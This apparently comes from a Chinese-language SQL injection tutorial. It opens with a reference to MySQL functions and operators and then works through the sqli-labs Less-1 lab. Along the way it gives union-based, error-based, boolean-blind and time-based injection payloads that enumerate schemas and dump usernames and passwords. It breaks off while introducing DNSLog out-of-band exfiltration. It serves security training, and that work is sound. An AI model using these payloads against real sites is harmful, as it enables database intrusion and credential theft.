|+--------------------------------------+# MySQL安装路径mysql&gt; select @@basedir;+---------------------------------+| @@basedir |+---------------------------------+| C:/myphp_www/PHPTutorial/MySQL/ |+---------------------------------+# 操作系统mysql&gt; select @@version_compile_os;+----------------------+| @@version_compile_os |+----------------------+| Win32 |+----------------------+# 返回md5加密后的字符串mysql&gt; select md5(233);+----------------------------------+| md5(233) |+----------------------------------+| e165421110ba03099a1c0393373c5b43 |+----------------------------------+ 数学函数 函数 说明 FLOOR(X) 返回不大于X的最大整数。 RAND() 返回0~1的随机数 ROUND(X) 返回离X最近的整数，截断时要进行四舍五入。 简单演示： 123456789101112131415mysql&gt; select round(1.4);+------------+| round(1.4) |+------------+| 1 |+------------+1 row in set (0.00 sec)mysql&gt; select round(1.5);+------------+| round(1.5) |+------------+| 2 |+------------+1 row in set (0.00 sec) 聚合函数 函数 说明 COUNT(expr) 返回查询结果的行数 简单演示 123456mysql&gt; select count(*) from users;+----------+| count(*) |+----------+| 13 |+----------+ 日期时间函数 函数 说明 CURDATE()、CURRENT_DATE() 返回当前日期，格式：yyyy-MM-dd CURTIME()、CURRENT_TIME() 返回当前时间，格式：HH:mm:ss NOW() 返回当前日期和时间，格式：yyyy-MM-dd HH:mm:ss 编码转换函数 函数 说明 BIN(X) 返回X的二进制信息 CONV(N,from_base,to_base) 将N从from_base转换成to_base格式 HEX(X) 返回X的十六进制信息 MD5(X) 返回X的MD5信息 UNHEX(X) 对X进行十六进制解码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061mysql&gt; select hex('MySQL');+--------------+| hex('MySQL') |+--------------+| 4D7953514C |+--------------+1 row in set (0.00 sec)mysql&gt; select unhex('4D7953514C');+---------------------+| unhex('4D7953514C') |+---------------------+| MySQL |+---------------------+1 row in set (0.01 sec)mysql&gt; select x'4D7953514C';+---------------+| x'4D7953514C' |+---------------+| MySQL |+---------------+1 row in set (0.00 sec)mysql&gt; select 0x4D7953514C;+--------------+| 0x4D7953514C |+--------------+| MySQL |+--------------+1 row in set (0.00 sec)mysql&gt; select hex(233);+----------+| hex(233) |+----------+| E9 |+----------+mysql&gt; select conv('E9',16,10);+------------------+| conv('E9',16,10) |+------------------+| 233 |+------------------+mysql&gt; select conv('E9',16,2);+-----------------+| conv('E9',16,2) |+-----------------+| 11101001 |+-----------------+mysql&gt; select conv('E9',16,8);+-----------------+| conv('E9',16,8) |+-----------------+| 351 |+-----------------+ 字符串函数 函数 说明 ASCII(s) 返回字符串 s 的第一个字符的 ASCII 码 CONCAT(s1,s2…sn) 字符串 s1,s2 等多个字符串合并为一个字符串 CONCAT_WS(x, s1,s2…sn) 同 CONCAT(s1,s2,…) 函数，但是每个字符串直接要加上 x，x 可以是分隔符 GROUP_CONCAT(str1,str2,…) 函数返回一个字符串结果，默认查询所有结果。 LEFT(s,n) 返回字符串 s 的前 n 个字符 LENGTH(s) 返回字符串 s 的前 n 个字符 LENGTH(s) 返回字符串 s 的长度 MID(s,n,len) 从字符串 s 的 start 位置截取长度为 length 的子字符串 RIGHT(s,n) 返回字符串 s 的后 n 个字符 RTRIM(s) 返回字符串 s 的后 n 个字符 STRCMP(s1,s2) 比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1 SUBSTR(s, start, length) 从字符串 s 的 start 位置截取长度为 length 的子字符串 TRIM(s) 去掉字符串 s 开始和结尾处的空格 RTRIM(s) 去掉字符串 s 结尾处的空格 简单的演示： ASCII(s) 返回字符串 s 的第一个字符的 ASCII 码 123456mysql&gt; select ascii(version());+------------------+| ascii(version()) |+------------------+| 53 |+------------------+ CONCAT(s1,s2…sn) 1select concat(user(),version(),database()); CONCAT_WS(x, s1,s2…sn) 1select concat_ws(&apos; &apos;,user(),version(),database()); GROUP_CONCAT(str1,str2,…) 12345678mysql&gt; select group_concat(user(),version(),database());+-------------------------------------------+| group_concat(user(),version(),database()) |+-------------------------------------------+| root@10.211.55.25.5.53security |+-------------------------------------------+SELECT GROUP_CONCAT(id,username,password) AS users FROM users; 嫌太挤可以用空格&lt;br&gt; 或者&#39;:&#39;分隔开 LEFT(s,n) 返回字符串 s 的前 n 个字符 1select left(user(),4); LENGTH(s) 返回字符串 s 的长度 1select length(user()); MID(s,n,len) 从字符串 s 的 start 位置截取长度为 length 的子字符串 1select mid(user(),5,10); RIGHT(s,n) 返回字符串 s 的后 n 个字符 1select right(user(),10); RTRIM(s) 去掉字符串 s 结尾处的空格 1select rtrim(&quot;Good Day &quot;) as A; STRCMP(s1,s2) 比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1 1234567891011121314151617181920212223242526272829mysql&gt; select version();+-----------+| version() |+-----------+| 5.5.53 |+-----------+mysql&gt; select strcmp(&apos;5.5.53&apos;,version());+----------------------------+| strcmp(&apos;5.5.53&apos;,version()) |+----------------------------+| 0 |+----------------------------+mysql&gt; select strcmp(&apos;4&apos;,version());+-----------------------+| strcmp(&apos;4&apos;,version()) |+-----------------------+| -1 |+-----------------------+mysql&gt; select strcmp(&apos;6&apos;,version());+-----------------------+| strcmp(&apos;6&apos;,version()) |+-----------------------+| 1 |+-----------------------+ SUBSTR(s, start, length) 从字符串 s 的 start 位置截取长度为 length 的子字符串 123456mysql&gt; select substr(user(),1,4);+--------------------+| substr(user(),1,4) |+--------------------+| root |+--------------------+ TRIM(s) 去掉字符串 s 开始和结尾处的空格 1select trim(&apos;Good Good Study! &apos;) as trim; 流程函数IF(expr,v1,v2) 如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。 1234567891011121314mysql&gt; select if(1&gt;0,&apos;是&apos;,&apos;否&apos;);+-------------------+| if(1&gt;0,&apos;是&apos;,&apos;否&apos;) |+-------------------+| 是 |+-------------------+mysql&gt; select if(left(user(),4)=&apos;root&apos;,&apos;root&apos;,&apos;not root&apos;);+---------------------------------------------+| if(left(user(),4)=&apos;root&apos;,&apos;root&apos;,&apos;not root&apos;) |+---------------------------------------------+| root |+---------------------------------------------+ case when [value] then [result] … else [default] end 12345678910111213mysql&gt; select case 2 when 1 then 'one' when 2 then 'two' else 'more' end as 'CASE测试';+------------+| CASE测试 |+------------+| two |+------------+mysql&gt; select case 3 when 1 then 'one' when 2 then 'two' else 'more' end as 'CASE测试';+------------+| CASE测试 |+------------+| more |+------------+ MySQL 运算符主要介绍 MySQL 的运算符及运算符的优先级。 MySQL 主要有以下几种运算符： 算术运算符 比较运算符 逻辑运算符 位运算符 算术运算符MySQL 支持的算术运算符包括: 运算符 作用 + 加法 - 减法 * 乘法 / 或 DIV 除法 % 或 MOD 取余 在除法运算和模运算中，如果除数为0，将是非法除数，返回结果为NULL。 1234567891011121314151617181920212223242526272829303132333435363738394041mysql&gt; select 1+2;+-----+| 1+2 |+-----+| 3 |+-----+mysql&gt; select 1-2;+-----+| 1-2 |+-----+| -1 |+-----+mysql&gt; select 2*3;+-----+| 2*3 |+-----+| 6 |+-----+mysql&gt; select 2/3;+--------+| 2/3 |+--------+| 0.6667 |+--------+mysql&gt; select 10 DIV 4;+----------+| 10 DIV 4 |+----------+| 2 |+----------+mysql&gt; select 10 MOD 4;+----------+| 10 MOD 4 |+----------+| 2 |+----------+ 比较运算符SELECT 语句中的条件语句经常要使用比较运算符。通过这些比较运算符，可以判断表中的哪些记录是符合条件的。比较结果为真，则返回 1，为假则返回 0，比较结果不确定则返回 NULL。 符号 描述 备注 = 等于 无 &lt;&gt;, != 不等于 无 &gt; 大于 无 &lt; 小于 无 &lt;= 小于等于 无 &gt;= 大于等于 无 BETWEEN 在两值之间 &gt;=min&amp;&amp;&lt;=max NOT BETWEEN 不在两值之间 无 IN 在集合中 无 NOT IN 不在集合中 无 &lt;=&gt; 严格比较两个NULL值是否相等 两个操作码均为NULL时，其所得值为1；而当一个操作码为NULL时，其所得值为0 LIKE 模糊匹配 无 REGEXP 或 RLIKE 正则式匹配 无 IS NULL 为空 无 IS NOT NULL 不为空 无 1234567891011121314151617181920212223242526272829# 等于mysql&gt; select 2=3;+-----+| 2=3 |+-----+| 0 |+-----+mysql&gt; select NULL = NULL;+-------------+| NULL = NULL |+-------------+| NULL |+-------------+# 不等于mysql&gt; select 2&lt;&gt;3;+------+| 2&lt;&gt;3 |+------+| 1 |+------+mysql&gt; select 2!=3;+------+| 2!=3 |+------+| 1 |+------+ 安全等于 与 = 的区别在于当两个操作码均为 NULL 时，其所得值为 1 而不为 NULL，而当一个操作码为 NULL 时，其所得值为 0而不为 NULL。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179mysql&gt; select 2&lt;=&gt;3;+-------+| 2&lt;=&gt;3 |+-------+| 0 |+-------+mysql&gt; select null=null;+-----------+| null=null |+-----------+| NULL |+-----------+mysql&gt; select null&lt;=&gt;null;+-------------+| null&lt;=&gt;null |+-------------+| 1 |+-------------+# 小于mysql&gt; select 2&lt;3;+-----+| 2&lt;3 |+-----+| 1 |+-----+# 小于等于mysql&gt; select 2&lt;=3;+------+| 2&lt;=3 |+------+| 1 |+------+# 大于mysql&gt; select 2&gt;3;+-----+| 2&gt;3 |+-----+| 0 |+-----+# 大于等于mysql&gt; select 2&gt;=3;+------+| 2&gt;=3 |+------+| 0 |+------+# BETWEEN 在两值之间mysql&gt; select 5 between 1 and 10;+--------------------+| 5 between 1 and 10 |+--------------------+| 1 |+--------------------+# IN 在集合中mysql&gt; select 5 in (1,2,3,4,5);+------------------+| 5 in (1,2,3,4,5) |+------------------+| 1 |+------------------+# NOT IN 不再集合中mysql&gt; select 5 not in (1,2,3,4,5);+----------------------+| 5 not in (1,2,3,4,5) |+----------------------+| 0 |+----------------------+# IS NULL 判断是否为空mysql&gt; select null is NULL;+--------------+| null is NULL |+--------------+| 1 |+--------------+mysql&gt; select &apos;a&apos; is NULL;+-------------+| &apos;a&apos; is NULL |+-------------+| 0 |+-------------+# IS NOT NULL 判断是否不为空mysql&gt; select null IS NOT NULL;+------------------+| null IS NOT NULL |+------------------+| 0 |+------------------+mysql&gt; select &apos;a&apos; IS NOT NULL;+-----------------+| &apos;a&apos; IS NOT NULL |+-----------------+| 1 |+-----------------+# LIKE 模糊查询mysql&gt; select &apos;12345&apos; like &apos;12%&apos;;+--------------------+| &apos;12345&apos; like &apos;12%&apos; |+--------------------+| 1 |+--------------------+mysql&gt; select &apos;12345&apos; like &apos;12_&apos;;+--------------------+| &apos;12345&apos; like &apos;12_&apos; |+--------------------+| 0 |+--------------------+mysql&gt; select &apos;12345&apos; like &apos;%3%&apos;;+--------------------+| &apos;12345&apos; like &apos;%3%&apos; |+--------------------+| 1 |+--------------------+mysql&gt; select &apos;12345&apos; like &apos;%5&apos;;+-------------------+| &apos;12345&apos; like &apos;%5&apos; |+-------------------+| 1 |+-------------------+# REGEXP 正则匹配mysql&gt; select &apos;beijing&apos; REGEXP &apos;jing&apos;;+-------------------------+| &apos;beijing&apos; REGEXP &apos;jing&apos; |+-------------------------+| 1 |+-------------------------+mysql&gt; select &apos;beijing&apos; REGEXP &apos;xi&apos;;+-----------------------+| &apos;beijing&apos; REGEXP &apos;xi&apos; |+-----------------------+| 0 |+-----------------------+mysql&gt; select &apos;beijing&apos; REGEXP &apos;^b&apos;;+-----------------------+| &apos;beijing&apos; REGEXP &apos;^b&apos; |+-----------------------+| 1 |+-----------------------+mysql&gt; select &apos;beijing&apos; REGEXP &apos;g$&apos;;+-----------------------+| &apos;beijing&apos; REGEXP &apos;g$&apos; |+-----------------------+| 1 |+-----------------------+mysql&gt; select &apos;beijing&apos; REGEXP &apos;[0-9]&apos;;+--------------------------+| &apos;beijing&apos; REGEXP &apos;[0-9]&apos; |+--------------------------+| 0 |+--------------------------+mysql&gt; select &apos;beijing&apos; REGEXP &apos;[a-z]&apos;;+--------------------------+| &apos;beijing&apos; REGEXP &apos;[a-z]&apos; |+--------------------------+| 1 |+--------------------------+ 逻辑运算符逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。 运算符号 作用 NOT 或 ! 逻辑非 AND 或 &amp;&amp; 逻辑与 OR 或 \ \ 逻辑或 XOR 或 ^ 逻辑异或 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# 与mysql&gt; select 2 and 0;+---------+| 2 and 0 |+---------+| 0 |+---------+mysql&gt; select 2 and 1;+---------+| 2 and 1 |+---------+| 1 |+---------+mysql&gt; select 2 &amp;&amp; 0;+--------+| 2 &amp;&amp; 0 |+--------+| 0 |+--------+# 或mysql&gt; select 2 or 0;+--------+| 2 or 0 |+--------+| 1 |+--------+mysql&gt; select 2 or 1;+--------+| 2 or 1 |+--------+| 1 |+--------+mysql&gt; select 0 or 0;+--------+| 0 or 0 |+--------+| 0 |+--------+mysql&gt; select 1 || 0;+--------+| 1 || 0 |+--------+| 1 |+--------+# 非mysql&gt; select not 1;+-------+| not 1 |+-------+| 0 |+-------+mysql&gt; select !0;+----+| !0 |+----+| 1 |+----+# 异或 # 如果a、b两个值不相同，则异或结果为1。 如果a、b两个值相同，异或结果为0。mysql&gt; select 1 xor 1;+---------+| 1 xor 1 |+---------+| 0 |+---------+mysql&gt; select 0 xor 0;+---------+| 0 xor 0 |+---------+| 0 |+---------+mysql&gt; select 1 xor 0;+---------+| 1 xor 0 |+---------+| 1 |+---------+mysql&gt; select 1 ^ 0;+-------+| 1 ^ 0 |+-------+| 1 |+-------+mysql&gt; select 1 ^ null;+----------+| 1 ^ null |+----------+| NULL |+----------+ 位运算符位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。 运算符号 作用 &amp; 按位与 \ 按位或 ^ 按位异或 ! 取反 &lt;&lt; 左移 &gt;&gt; 右移 1234567891011121314# 按位与 两个二进位都为1时，结果位才为1mysql&gt; select 1 &amp; 2;+-------+| 1 &amp; 2 |+-------+| 0 |+-------+mysql&gt; select 1 &amp; 3;+-------+| 1 &amp; 3 |+-------+| 1 |+-------+ &amp;&amp;是逻辑与 即判断&amp;&amp;两侧的表达式是否都为真，都为真则此&amp;&amp;表达式值为真； &amp; 是按位与 即将&amp;两侧的数用二进制展开，每一位都求与运算(二进制与运算，跟逻辑与差不多)，最后得到的二进制数即为结果；逻辑与结果只讲真和假，而按位与得出的却是实实在在的一个数 12345671 -&gt; 012 -&gt; 10 001 -&gt; 013 -&gt; 11 01 SQL 注入靶场sqli-labs项目地址：https://github.com/Audi-1/sqli-labs 一个比较全的 SQL 注入靶场环境 DVWA项目地址：https://github.com/ethicalhack3r/DVWA 经典的综合漏洞靶场环境 web for pentester官网地址：https://pentesterlab.com/exercises/web_for_pentester/course 常见 Web 漏洞的靶场环境，ISO 文件挂载部署也比较方便 SQL 注入工具Hackbar手工注入必备工具 修改了浮夸的界面，爱护眼睛才是第一.感谢r0oth3x49升级！By Darkmelody. 文件名 下载地址 备用链接 hackbar.1.6.5.xpi 蓝奏云 蓝奏云 自从用了这款Hackbar插件后，手工注入的速度大大提高了,通过F9开启和隐藏也十分地方便。 Firefox Dev经国光本人一个个测试，最终发现使用 Firefox 的 Dev 版本中的 56.0b9 版本可以完美地安装老版本的Hackbar 插件，安装过后，手工注入的速度嗖嗖的上涨，并且 Firefox 可以完美的导入 BP 的 SSL 证书，很方便我们后期使用 BurpSuite 抓取 HTTPS 网站。 平台 下载地址（官方） 备用下载（Onedriver） Windows64位 Firefox Setup 56.0b9.exe Firefox Setup 56.0b9.exe Windows32位 Firefox Setup 56.0b9.exe 32位 国光比较懒 不提供备用下载 Linux x86_64 firefox-56.0b9.tar.bz2 firefox-56.0b9.tar.bz2 macOS Firefox 56.0b9.dmg Firefox 56.0b9.dmg 关闭自动更新 首先下载完启动Firefox Developer Edition一定要断网！断网！断网！因为火狐的策略问题，默认会自动更新，联网安装的话，刚刚安装完的时候就会被强制更新最新版本了，所以断网安装大法保平安。安装完成后，设置里面勾选不检查更新。然后就可以恢复联网了 允许第三方插件 火狐安全策略的原因是无法顺利安装一些第三方插件的，得手动去高级选项里面关闭一下，浏览器打开： about:config 点击我了解此风险： 鼠标下滑，找到倒数第3和第4个选项，即xpinstall.signatures.required和xpinstall.whitelist.required，将值切换为false： 然后就可以愉快地安装一些第三方插件了 SQLMap自动化注入必备神器 项目地址：https://github.com/sqlmapproject/sqlmap 在实战中基本上都是靠 SQLMap 因为纯手工盲注得注入到天荒地老 手工注入只是加深对注入的原理的理解 UNION 联合查询注入SQLi-Labs Less1Less1 是一个非常经典的 SQL的注入漏洞类型，这里就来演示讲解一下手工注入的流程。 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];// connectivity$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";$result=mysql_query($sql);// 输出所有查询的数据，从结果集中取得一行作为关联数组 如果没有更多行则返回 false$row = mysql_fetch_array($result); if($row) &#123; echo "&lt;font size='5' color= '#99FF00'&gt;"; echo 'Your Login name:'. $row['username']; echo "&lt;br&gt;"; echo 'Your Password:' .$row['password']; echo "&lt;/font&gt;"; &#125; else &#123; echo '&lt;font color= "#FFFF00"&gt;'; print_r(mysql_error()); echo "&lt;/font&gt;"; &#125;&#125; else &#123; echo "Please input the ID as parameter with numeric value";&#125;?&gt; 推测SQL语句尝试构造payload： 1/Less-1/?id=1&apos; 这样MySQL语句就变成了这样了： 1SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1 所以我们会看到这样的提示： 1234567on for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1&apos;&apos;1&apos;&apos; LIMIT 0,1&apos;&apos;1&apos;&apos; LIMIT 0,11&apos; 反推测出代码中的 SQL 语句： 1select * from tables where id ='' limit 0,1 闭合注入我们前面输入的 引号&#39;被闭合了，但是没有闭合后面的引号，导致后面的引号报错了，尝试闭合试试看： 1/Less-1/?id=1' and '1'='1 这样MySQL语句就变成了这样了： 123select * from tables where id ='1' limit 0,1select * from tables where id ='1' and '1'='1' limit 0,1 此时完美毕业，页面应该是正常响应的。 注释注入因为使用GET传递值的时候，浏览器会自动帮我们进行 URL 解码，所以经常如下使用： 构造一个报错的页面： 1234567891011121314and 1=1 %23and 1=2 %23and 1=1 --+and 1=2 --+' and 1=1 %23' and 1=2 %23' and 1=1 --+' and 1=2 --+" and 1=1 %23" and 1=2 %23" and 1=1 --+" and 1=2 --+ 构造一个延时： 12' and sleep(10) %23' and sleep(10) --+ 所以在 POST 注入的时候 我们常直接使用 # 来注释语句 判断字段数目12345?id=1’ order by 1 --+ 此时页面正常，继续换更大的数字测试?id=1’ order by 10--+ 此时页面返回错误，更换小的数字测试?id=1’ order by 5 --+ 此时页面依然报错，继续缩小数值测试?id=1’ order by 3 --+ 此时页面返回正常，更换大的数字测试?id=1’ order by 4 --+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3 数学里面的二分对半查找，用以确定字段数目。 联合查询UNION SELECT 联合查询，手工注入经典语句，作用是在后面通过UNION把我们的恶意注入语句接上去，带入数据库进行查询。 因为字段数目是:3,那么正规的语句如下: 1?id=1&apos; UNION SELECT 1,2,3 --+ 这里页面是不会报错的，此时我们带入数据库的语句为: 1234567mysql&gt; SELECT * FROM users WHERE id=&apos;1&apos; UNION SELECT 1,2,3;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb || 1 | 2 | 3 |+----+----------+----------+ 使用and语句故意构造报错： 1SELECT * FROM users WHERE id=&apos;1&apos; and 1=2 union select 1,2,3 --+&apos; LIMIT 0,1 使用利用数据本身构造报错： 1SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,3 --+&apos; LIMIT 0,1 来看下数据库的语句情况： 123456mysql&gt; SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 3 |+----+----------+----------+ 其字段内容可以在页面显示，不一定要用union select 1,2,3形式 基本信息收集在对应字段放入要查询的函数 12345# 查询数据库版本和用户信息and 1=2 union select 1,version(),user() --+# 查询当前数据库和系统版本and 1=2 union select 1,database(),@@version_compile_os --+ 课堂思考问题 为什么 order by 可以判断字段数？ 为什么先判断字段数才可再使用 union 联合查询？ 为什么联合查询不配合报错看不到回显信息？ 为什么联合查询爆出的字段可以用来利用？非要用 union select 1,2,3 形式吗？ 查询所有数据库 需要注意插入位置 中间字段的话 需要手动分开语句 1234567group_concat(schema_name) from information_schema.schematagroup_concat(schema_name separator 0x3c62723e) from information_schema.schemata;group_concat(schema_name separator &apos;&lt;br&gt;&apos;) from information_schema.schemata;group_concat(schema_name separator &apos;:&apos;) from information_schema.schemata; 手动去数据库的表里查看下数据。 information_schema 数据库下的 schemata表中的schema_name记录的是各个数据库的名称: 查看当前数据库表名1group_concat(table_name) from information_schema.tables where table_schema=database() tables表中的table_name列记录了所有的表名 tables表中的table_schema列记录了所有的数据库名 查看其他数据库表名12345678# 用引号group_concat(table_name) from information_schema.tables where table_schema=&apos;数据库名&apos;# hex编码group_concat(table_name) from information_schema.tables where table_schema=0x776F6F79756Egroup_concat(table_name) from information_schema.tables where table_schema=unhex(7365637572697479) 查询当前数据库下的 users 表的列名1group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; 查询其他数据库下表的列名1group_concat(column_name) from information_schema.columns where table_schema=&apos;数据库名&apos; and table_name=&apos;表名&apos;; 查询当前库下的字段值1group_concat(id,username,password) from users 查询其他库下的字段值1group_concat(字段名) from 数据库名.表名 Hackbar 半自动化注入回到刚刚的 Less 1 ，下面全程尝试使用 Hackbar 来进行手工注入查询： 查询所有的数据库名1union select 1,(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),3 --+ 查询当前数据库的表名1union select 1,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),3 --+ 查询 users 表的列名1union select 1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x7573657273),3 --+ 查询 username,password 的字段值最后一步 也就是 dump 数据 1union select 1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3 --+ 查询其他数据库的表名1union select 1,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6368616c6c656e676573),3 --+ 查询出的表名为：1j9hvmml6l 查询其他数据库的表名下的列名1union select 1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x316a3968766d6d6c366c+and+table_schema='challenges'),3 --+ 基于报错的注入报错注入利用条件是网站开启了 SQL 报错日志功能，否则无法使用报错注入，具有一定的局限性。 1mysql_error() 一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组 1select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a; 利用了 MySQL 的第 8652 号 Bug ：Bug #8652 group by part of rand() returns duplicate key error 来进行的盲注，使得 MySQL 由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果 报错注入因为日志报错问题只能报一行 xpath 语法错误123select extractvalue(1,concat(0x7e,(select @@version),0x7e));select updatexml(1,concat(0x7e,(select @@version),0x7e),1); 重复特性1select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; Hackbar Payload报错注入比较简单粗暴，无需构造 Union select 语句了，直接闭合/注释掉 SQL 语句即可注入查询。 1234567891011121314# version+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1# database+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)# tables+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)# columns+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x7573657273+AND+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)# data+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a) 手动进行数据偏移来查询下一条数据： 1LIMIT+0,1 布尔类型盲注盲注的概念页面无法进行显示 SQL 查询的数据，导致之前使用的显错注入就无法成功注入。 盲注就是在 SQL 注入过程中，SQL 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注 盲注的原理获取数据库长度 123# security 8位and length(database())&gt;7and length(database())&gt;8 LEFT函数 LEFT(s,n)返回字符串 s 的前 n 个字符 123456789# 第1位left(database(),1)&gt;'a';left(database(),1)&gt;'z';left(database(),1)&gt;'e';# 第2位left(database(),2)&gt;'sa';left(database(),2)&gt;'sz';left(database(),2)&gt;'se'; MID函数 MID(s,n,len)从字符串 s 的 start 位置截取长度为 length 的子字符串 12345678910111213# 第1位and mid(user(),1,1)&gt;'a' ;and mid(user(),1,1)&gt;'z' ;and mid(user(),1,1)&gt;'q' ;and mid(user(),1,1)&gt;'r' ;# 第2位and mid(user(),1,2)&gt;'rn' ;and mid(user(),1,2)&gt;'ro' ;# 或者这样and mid(user(),2,1)&gt;'n'and mid(user(),2,1)&gt;'0' SUBSTR函数 SUBSTR(s, start, length)从字符串 s 的 start 位置截取长度为 length 的子字符串 12and substr(version(),1,1)&gt;4;and substr(version(),1,1)&gt;5; ASCII ASCII(s)返回字符串 s 的第一个字符的 ASCII 码 12345and ascii(user())&gt;113 ;and ascii(user())&gt;114 ;and ascii(mid(user(),1,1))&gt;113 ;and ascii(mid(user(),1,1))&gt;114 ; ORD ORD()函数返回字符串第一个字符的 ASCII值。 1and ord(mid((select username from security.users order by id limit 0,1),1,1))=68 IF与REGEXP与LIKE IF(expr,v1,v2)如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。 1234567891011121314151617# 判断用户名and 1=(if((user() regexp &apos;^ro&apos;),1,0));# 查表名and 1=(select 1 from information_schema.tables where table_schema=&apos;security&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1);# 查列名and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^us[a-z]&apos; limit 0,1);# 查内容and ord(mid((select username from security.users order by id limit 0,1),1,1))=68mysql&gt; select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1;+-------------------------------------+| ifnull(cast(username as char),0x20) |+-------------------------------------+| Dumb |+-------------------------------------+ CAST函数 1Cast(字段名 as 转换的类型 ) CAST()函数将任何类型的值转换为具有指定类型的值。目标类型可以是以下类型之一： BINARY，CHAR，DATE，DATETIME，TIME，DECIMAL，SIGNED，UNSIGNED。 该函数通常用于返回具有指定类型的值 IFNULL 1IFNULL(expr1,expr2) 如果 expr1 不是NULL，IFNULL() 返回 expr1，否则它返回 expr2 基于时间类型盲注SLEEP(tiem)依然是配合字符串截取函数使用，用来作为延时的条件。 123456789# 当前数据库第一位 s 的 ascii 码mysql&gt; select ascii(database());+-------------------+| ascii(database()) |+-------------------+| 115 |+-------------------+and 1=if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) 相当于原来的 and 判断现在直接使用是否触发sleep()函数来判断是否产生了注入。 BENCHMARK(count,expr)用于基准测试函数的性能，参数一为运算次数数，参数二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。 这是一种边信道攻击，在运行过程中占用大量的 cpu 资源，而且比较主观。推荐使用 sleep() 函数进行注入。 1and 1=if(ascii(substr(database(),1,1))&gt;115,1,BENCHMARK(10000000000,md5(233))) DNSLog外带数据DNSLog 在 Web 漏洞利用中已经是老生常谈的问题，简单理解就是在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起 DNS 请求，这个时候就可以通过这种方式把想获得的数据外带出来。 DNSLog 平台地址DNSLog项目地址：https://github.com/BugScanTeam/DNSLog 在线演示地址：https://admin.dnslog.link/ test/123456 ceye官网地址：http://ceye.io/ Hyuga项目地址：https://github.com/Buzz2d0/Hyuga 演示地址：http://hyuga.co 开启 load_file()因为 dnslog 盲注需要使用 load_file() 函数，所以一般得是高权限用户。sql 语句 1show variables like '%secure%'; 查看 load_file() 